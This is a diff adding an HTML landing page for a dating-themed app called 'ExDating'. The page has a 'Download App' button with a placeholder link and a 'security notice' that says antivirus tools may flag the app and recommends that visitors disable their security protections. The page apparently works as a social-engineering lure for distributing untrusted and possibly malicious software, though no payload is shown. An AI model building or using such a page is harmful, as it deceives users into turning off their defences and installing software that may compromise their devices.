@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ExDating – Social App</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'Segoe UI', Tahoma, sans-serif;
+  background: linear-gradient(135deg, #ff758c, #ff7eb3);
+  color: #333;
+  text-align: center;
+}
+
+/* HEADER */
+header {
+  padding: 60px 20px;
+  color: white;
+  animation: fadeIn 1.5s ease;
+}
+
+header h1 {
+  font-size: 3em;
+}
+
+header p {
+  font-size: 1.2em;
+  margin-top: 10px;
+}
+
+/* BUTTON */
+.btn {
+  display: inline-block;
+  margin-top: 30px;
+  padding: 18px 45px;
+  font-size: 1.2em;
+  color: white;
+  text-decoration: none;
+  border-radius: 50px;
+  background: linear-gradient(135deg, #ff416c, #ff4b2b);
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.btn:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 15px 25px rgba(0,0,0,0.3);
+}
+
+/* MAIN */
+main {
+  background: #f8f8f8;
+  border-radius: 40px 40px 0 0;
+  padding: 60px 20px;
+  margin-top: -30px;
+}
+
+/* PROFILE CARDS */
+.cards {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  margin-top: 40px;
+}
+
+.card {
+  background: white;
+  width: 260px;
+  margin: 15px;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+  transition: transform 0.3s;
+  animation: slideUp 1.2s ease;
+}
+
+.card:hover {
+  transform: translateY(-10px);
+}
+
+.card img {
+  width: 100%;
+  height: 220px;
+  object-fit: cover;
+}
+
+.card h3 {
+  margin: 15px 0 5px;
+  color: #ff416c;
+}
+
+.card p {
+  padding: 0 15px 20px;
+  font-size: 0.95em;
+}
+
+/* NOTICE */
+.notice {
+  max-width: 800px;
+  margin: 60px auto 0;
+  background: #fff3cd;
+  border: 1px solid #ffeeba;
+  border-radius: 15px;
+  padding: 25px;
+  color: #856404;
+  animation: fadeIn 2s ease;
+}
+
+.notice h3 {
+  margin-bottom: 15px;
+}
+
+/* FOOTER */
+footer {
+  margin-top: 60px;
+  padding: 20px;
+  background: #ddd;
+  font-size: 0.9em;
+}
+
+/* ANIMATIONS */
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(40px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* RESPONSIVE */
+@media (max-width: 768px) {
+  header h1 {
+    font-size: 2.2em;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>💔 ExDating</h1>
+  <p>Connect, share experiences, and move forward.</p>
+  <a class="btn" href="YOUR_DOWNLOAD_LINK_HERE" target="_blank">Download App</a>
+</header>
+
+<main>
+  <h2>Discover Stories</h2>
+  <p>Anonymous experiences. No names. No drama.</p>
+
+  <div class="cards">
+    <div class="card">
+      <img src="https://picsum.photos/400/300?1">
+      <h3>Anonymous</h3>
+      <p>Sharing stories helps healing and growth.</p>
+    </div>
+
+    <div class="card">
+      <img src="https://picsum.photos/400/300?2">
+      <h3>Respectful</h3>
+      <p>No harassment. No personal details.</p>
+    </div>
+
+    <div class="card">
+      <img src="https://picsum.photos/400/300?3">
+      <h3>Supportive</h3>
+      <p>A safe space to move on positively.</p>
+    </div>
+  </div>
+
+  <div class="notice">
+    <h3>⚠️ Important Security Notice</h3>
+    <p>
+      This application is new and may not yet be recognized by all antivirus software.
+      Some systems may display a warning because of this.
+    </p>
+    <p>
+      <strong>We recommend disabling security protections.</strong><br>
+      Only install the app if you trust the source.
+    </p>
+    <p>
+      
+    </p>
+  </div>
+</main>
+
+<footer>
+  <p>&copy; 2025 ExDating – Independent Project</p>
+</footer>
+
+</body>
+</html>
